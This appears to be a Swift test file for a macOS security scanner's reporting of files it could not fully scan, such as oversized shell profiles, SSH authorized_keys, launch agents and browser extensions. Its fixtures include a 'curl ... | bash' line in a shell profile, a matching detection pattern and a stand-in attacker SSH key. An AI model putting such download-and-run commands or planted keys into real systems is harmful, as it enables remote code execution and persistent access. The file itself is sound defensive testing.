import Foundation
import Testing
@testable import BluehatCore

struct ScanNoticeTests {
    static let publicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGd6 attacker@evil"

    let root = FileManager.default.temporaryDirectory.appending(path: "bluehat-notices-\(UUID().uuidString)")

    func rule(_ check: CheckKind, patterns: [String]? = nil) -> Rule {
        Rule(id: "\(check.rawValue).test", title: "Test", severity: .high, category: .malware, check: check, patterns: patterns, paths: nil, ports: nil, hashes: nil, setting: nil, product: nil, advisory: nil, ranges: nil, packages: nil, files: nil, teams: nil, bundles: nil, minimumVersion: nil, hosts: nil, summary: nil, remedy: nil, references: nil)
    }

    func write(_ text: String, to relativePath: String, paddedTo size: Int? = nil) throws -> String {
        let url = root.appending(path: relativePath)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        var data = Data(text.utf8)
        if let size { data.append(Data(repeating: UInt8(ascii: "\n"), count: size - data.count)) }
        try data.write(to: url)
        return url.path
    }

    func location(_ path: String) -> String {
        Finding.displayable(NSString(string: path).abbreviatingWithTildeInPath)
    }

    func launchPlist(_ arguments: [String]) throws -> String {
        let data = try PropertyListSerialization.data(fromPropertyList: ["ProgramArguments": arguments], format: .xml, options: 0)
        return String(decoding: data, as: UTF8.self)
    }

    @Test func oversizedShellProfileIsStillCheckedAndListed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let profile = try write("curl http://x.example/i.sh | bash\n", to: "zshrc", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: [#"curl.*\|\s*bash"#])], files: [profile])
        #expect(checked.findings.map(\.path) == [profile])
        #expect(checked.notScanned.map(\.path) == [profile])
        #expect(checked.notScanned.map(\.reason) == [.partlyRead])
        #expect(checked.notScanned.map(\.explanation) == ["Only the first 1 MB was read (Shell profile check)"])
    }

    @Test func oversizedSparseShellProfileCostsOnlyTheFirstMegabyte() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let profile = try write("echo hi\n", to: "zshrc")
        #expect(truncate(profile, 8 << 30) == 0)
        let clock = ContinuousClock()
        let elapsed = clock.measure {
            #expect(Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [profile]).notScanned.first?.path == profile)
        }
        #expect(elapsed < .seconds(5))
    }

    @Test func aSymlinkedShellProfileIsFollowedAndListed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let target = try write("evil-marker\n", to: "dotfiles/zshrc", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        let link = root.appending(path: "zshrc").path
        try FileManager.default.createSymbolicLink(atPath: link, withDestinationPath: target)
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [link])
        #expect(checked.findings.map(\.path) == [link])
        #expect(checked.notScanned.first?.path == link)
    }

    @Test func normalFilesListNothing() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let profile = try write("export PATH=/usr/bin\n", to: "zshrc")
        let atTheLimit = try write("export PATH=/usr/bin\n", to: "zprofile", paddedTo: ScanLimits.defaults[.maxReadBytes])
        let keys = try write(Self.publicKey + "\n", to: "authorized_keys")
        #expect(Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [profile, atTheLimit]).notScanned.isEmpty)
        #expect(Scanner.sshKeyFindings([rule(.sshKey)], files: [keys]).notScanned.isEmpty)
    }

    @Test func missingFilesAndFifosListNothingAndDoNotHang() throws {
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let fifo = root.appending(path: "zshrc").path
        #expect(mkfifo(fifo, 0o600) == 0)
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [fifo, root.appending(path: "missing").path])
        #expect(checked.findings.isEmpty)
        #expect(checked.notScanned.isEmpty)
    }

    @Test func longLineInAShellProfileIsListed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let padding = String(repeating: "x", count: ScanLimits.defaults[.maxMatchedLength])
        let profile = try write("\(padding) evil-marker\n", to: "zshrc")
        let exact = try write(String(repeating: "x", count: ScanLimits.defaults[.maxMatchedLength]) + "\n", to: "zprofile")
        let checked = Scanner.shellProfileFindings([rule(.shellProfile, patterns: ["evil-marker"])], files: [profile, exact])
        #expect(checked.findings.isEmpty)
        #expect(checked.notScanned.map(\.path) == [profile])
        #expect(checked.notScanned.map(\.explanation) == ["Only the first 8,192 characters of very long lines were matched (Shell profile check)"])
    }

    @Test func oversizedAuthorizedKeysStillReportsTheKeyAndListsTheFile() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let keys = try write(Self.publicKey + "\n", to: "authorized_keys", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        let checked = Scanner.sshKeyFindings([rule(.sshKey)], files: [keys])
        #expect(checked.findings.map(\.path) == [keys])
        #expect(checked.notScanned.map(\.path) == [keys])
        #expect(checked.notScanned.map(\.explanation) == ["Only the first 1 MB was read (SSH key check)"])
    }

    @Test func longKeyLineIsListed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let padded = #"environment="X=\#(String(repeating: "a", count: ScanLimits.defaults[.maxMatchedLength]))" "# + Self.publicKey
        let keys = try write(padded + "\n", to: "authorized_keys")
        let checked = Scanner.sshKeyFindings([rule(.sshKey, patterns: ["attacker@evil"])], files: [keys])
        #expect(checked.findings.isEmpty)
        #expect(checked.notScanned.map(\.path) == [keys])
        #expect(checked.notScanned.map(\.explanation) == ["Only the first 8,192 characters of very long lines were matched (SSH key check)"])
    }

    @Test func oversizedLaunchItemIsListedAndNormalOnesStillRead() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let oversized = try write(String(repeating: " ", count: 16), to: "agents/evil.plist", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        let normal = try write(try launchPlist(["/usr/bin/true"]), to: "agents/normal.plist")
        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])
        #expect(read.items.map(\.path) == [normal])
        #expect(read.notScanned.map(\.path) == [oversized])
        #expect(read.notScanned.map(\.reason) == [.overSizeLimit])
        #expect(read.notScanned.map(\.explanation) == ["Over the size limit (1 MB, limit 1 MB)"])
    }

    @Test func theSizeIsShownInPlainMegabytes() {
        let entry = NotScannedEntry.oversized(path: "/tmp/package.json", size: 1_091_575, limit: 1_000_000)
        #expect(entry.explanation == "Over the size limit (1.09 MB, limit 1 MB)")
    }

    @Test func normalLaunchItemsListNothing() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write(try launchPlist(["/usr/bin/true"]), to: "agents/normal.plist")
        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])
        #expect(read.notScanned.isEmpty)
        #expect(Scanner.launchItemFindings([rule(.launchItem, patterns: ["evil-marker"])], items: read.items).notScanned.isEmpty)
    }

    func launchPlistNested(_ depth: Int) -> String {
        let nesting = String(repeating: "<array>", count: depth) + String(repeating: "</array>", count: depth)
        return #"<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>Program</key><string>/tmp/evil-marker</string><key>Nested</key>\#(nesting)</dict></plist>"#
    }

    @Test(arguments: [
        ("malformed", #"<plist><dict><key>Program</key><string>/tmp/evil-marker</string>"#),
        ("a word", "evil-marker"),
        ("an array", #"<plist version="1.0"><array><string>/tmp/evil-marker</string></array></plist>"#),
    ])
    func aLaunchItemThatWontParseIsListedWithNoFinding(_ name: String, contents: String) throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let unparsed = try write(contents, to: "agents/evil.plist")
        let normal = try write(try launchPlist(["/usr/bin/true"]), to: "agents/normal.plist")

        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])

        #expect(read.items.map(\.path) == [normal])
        #expect(read.notScanned.map(\.path) == [unparsed])
        #expect(read.notScanned.map(\.reason) == [.couldNotParse])
        #expect(read.notScanned.map(\.explanation) == [Scanner.unparsedLaunchItemExplanation])
        #expect(Scanner.launchItemFindings([rule(.launchItem, patterns: ["evil-marker", "evil\\.plist"])], items: read.items).findings.isEmpty)
        #expect(Scanner.launchItemSignatureFindings([rule(.launchItemSignature)], items: read.items, checks: SignatureChecks()).isEmpty)
    }

    @Test func aLaunchItemNestedPastTheParserLimitIsListed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let tooDeep = try write(launchPlistNested(600), to: "agents/deep.plist")
        let parsable = try write(launchPlistNested(400), to: "agents/shallow.plist")

        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])

        #expect(read.items.map(\.path) == [parsable])
        #expect(read.notScanned.map(\.path) == [tooDeep])
        #expect(read.notScanned.map(\.reason) == [.couldNotParse])
    }

    @Test func anEmptyMissingOrNonFileLaunchItemListsNothing() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write("", to: "agents/empty.plist")
        _ = try write("  \n ", to: "agents/blank.plist")
        _ = try write(#"<plist version="1.0"><dict><key>Label</key><string>x</string></dict></plist>"#, to: "agents/noprogram.plist")
        let agents = root.appending(path: "agents")
        try FileManager.default.createSymbolicLink(atPath: agents.appending(path: "dangling.plist").path, withDestinationPath: root.appending(path: "missing").path)
        try FileManager.default.createDirectory(at: agents.appending(path: "folder.plist"), withIntermediateDirectories: true)
        #expect(mkfifo(agents.appending(path: "fifo.plist").path, 0o600) == 0)

        let read = Scanner.launchItemCommands(in: [agents.path, root.appending(path: "absent").path])

        #expect(read.items.isEmpty)
        #expect(read.notScanned.isEmpty)
    }

    @Test func anUnparsedLaunchItemReadByBothAreasIsListedOnce() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write("<plist><dict>", to: "agents/evil.plist")
        let directories = [root.appending(path: "agents").path]
        let notScanned = NotScannedCollector()
        notScanned.add(contentsOf: Scanner.launchItemCommands(in: directories).notScanned)
        notScanned.add(contentsOf: Scanner.launchItemCommands(in: directories).notScanned)
        let list = notScanned.finished()
        #expect(list.totalCount == 1)
        #expect(list.totalsByReason[.couldNotParse] == 1)
        #expect(list.summaryLine == "1 item couldn't be scanned")
    }

    @Test func longLaunchItemCommandIsListedAgainstItsPlist() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let padding = String(repeating: "x", count: ScanLimits.defaults[.maxMatchedLength])
        let plist = try write(try launchPlist(["/bin/sh", "-c", "\(padding) evil-marker"]), to: "agents/evil.plist")
        let read = Scanner.launchItemCommands(in: [root.appending(path: "agents").path])
        let checked = Scanner.launchItemFindings([rule(.launchItem, patterns: ["evil-marker"])], items: read.items)
        #expect(checked.findings.isEmpty)
        #expect(checked.notScanned.map(\.path) == [plist])
        #expect(checked.notScanned.map(\.explanation) == ["Only the first 8,192 characters of very long lines were matched (Launch item check)"])
    }

    @Test func oversizedChromiumManifestIsListed() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let id = "abcdefghijklmnopabcdefghijklmnop"
        let oversized = try write(#"{"name": "Evil"}"#, to: "Default/Extensions/\(id)/1.0_0/manifest.json", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        _ = try write(#"{"name": "Normal"}"#, to: "Default/Extensions/other/1.0_0/manifest.json")
        let read = Scanner.chromiumExtensions(browser: "Chrome", root: root.path)
        #expect(read.extensions.map(\.detail) == ["Chrome: Normal (other)"])
        #expect(read.notScanned.map(\.path) == [oversized])
        #expect(read.notScanned.map(\.reason) == [.overSizeLimit])
    }

    @Test func oversizedFirefoxIndexIsListedAndOneAtTheLimitIsNot() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let oversized = try write(#"{"addons": []}"#, to: "evil.default/extensions.json", paddedTo: ScanLimits.defaults[.maxExtensionIndexBytes] + 1)
        _ = try write(#"{"addons": []}"#, to: "fine.default/extensions.json", paddedTo: ScanLimits.defaults[.maxExtensionIndexBytes])
        #expect(Scanner.firefoxExtensions(profilesRoot: root.path).notScanned.map(\.path) == [oversized])
    }

    @Test func normalExtensionsListNothing() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write(#"{"name": "Normal"}"#, to: "Default/Extensions/other/1.0_0/manifest.json")
        #expect(Scanner.chromiumExtensions(browser: "Chrome", root: root.path).notScanned.isEmpty)
    }

    @Test func longCrontabLineIsASummaryRow() {
        let long = String(repeating: "x", count: ScanLimits.defaults[.maxMatchedLength]) + " evil-marker"
        let checked = Scanner.crontabFindings([rule(.crontab, patterns: ["evil-marker"])], lines: [long])
        #expect(checked.findings.isEmpty)
        #expect(checked.notScanned.map(\.name) == ["The crontab"])
        #expect(checked.notScanned.first?.path == nil)
        #expect(checked.notScanned.map(\.explanation) == ["Only the first 8,192 characters of very long lines were matched (Crontab check)"])
        #expect(Scanner.crontabFindings([rule(.crontab, patterns: ["evil-marker"])], lines: ["* * * * * evil-marker"]).notScanned.isEmpty)
    }

    @Test func aToolPastItsTimeIsListedAsTimedOut() {
        let notScanned = NotScannedCollector()
        #expect(Scanner.runTool("/bin/sleep", ["30"], timeout: 0.1, notScanned: notScanned).isEmpty)
        let entries = notScanned.finished().entries
        #expect(entries.map(\.name) == ["/bin/sleep"])
        #expect(entries.map(\.reason) == [.timedOut])
        #expect(entries.first?.path == nil)
    }

    @Test func aToolThatFinishesIsNotListed() {
        let notScanned = NotScannedCollector()
        #expect(Scanner.runTool("/bin/echo", ["hi"], notScanned: notScanned).contains("hi"))
        #expect(notScanned.finished().isEmpty)
    }

    @Test func longRunningProcessCommandLinesListNothing() throws {
        let marker = "bluehat-long-command-\(UUID().uuidString)"
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", "sleep 30; :", marker + String(repeating: "x", count: ScanLimits.defaults[.maxMatchedLength])]
        try process.run()
        defer { process.terminate() }
        var notices: [String] = []
        let notScanned = NotScannedCollector()
        var findings: [Finding] = []
        for _ in 0..<50 where findings.isEmpty {
            findings = Scanner.findings(in: .process, rules: [rule(.process, patterns: [marker])], projects: [], notices: &notices, notScanned: notScanned)
            if findings.isEmpty { usleep(100_000) }
        }
        #expect(!findings.isEmpty)
        #expect(notices.isEmpty)
        #expect(notScanned.finished().isEmpty)
    }

    @Test func manyPathsKeepANoticeShort() {
        let paths = (1...500).map { "/tmp/evil\(String(format: "%03d", $0)).plist" }
        #expect(Scanner.pathList(paths) == "/tmp/evil001.plist, /tmp/evil002.plist, /tmp/evil003.plist and 497 more")
    }

    @Test func longNamesAreClipped() {
        let long = "/tmp/" + String(repeating: "a", count: 1_000)
        #expect(Scanner.pathList([long]).count <= ScanLimits.defaults[.maxDetailLength] + 1)
        #expect(NotScannedEntry(reason: .noPermission, path: long).name.count <= ScanLimits.defaults[.maxDetailLength] + 1)
    }

    @Test func attackerNamesAreMadeDisplayable() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        let tricky = "evil\n\u{202E}gnp.plist"
        let path = try write("x", to: "agents/\(tricky)", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        let entry = try #require(Scanner.launchItemCommands(in: [root.appending(path: "agents").path]).notScanned.first)
        #expect(!entry.name.unicodeScalars.contains { $0.value == 0x202E || $0 == "\n" })
        #expect(entry.name.contains("evil gnp.plist"))
        #expect(entry.path == path)
        #expect(FileManager.default.fileExists(atPath: path))
    }

    @Test func homeIsShownWithATilde() {
        #expect(Scanner.pathList([NSHomeDirectory() + "/.zshrc"]) == "~/.zshrc")
        #expect(NotScannedEntry(reason: .noPermission, path: NSHomeDirectory() + "/.zshrc").name == "~/.zshrc")
    }

    @Test func aFileReadByTwoAreasIsListedOnce() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        _ = try write("x", to: "agents/evil.plist", paddedTo: ScanLimits.defaults[.maxReadBytes] + 1)
        let directories = [root.appending(path: "agents").path]
        let notScanned = NotScannedCollector()
        notScanned.add(contentsOf: Scanner.launchItemCommands(in: directories).notScanned)
        notScanned.add(contentsOf: Scanner.launchItemCommands(in: directories).notScanned)
        #expect(notScanned.finished().totalCount == 1)
        #expect(notScanned.finished().entries.count == 1)
    }
}
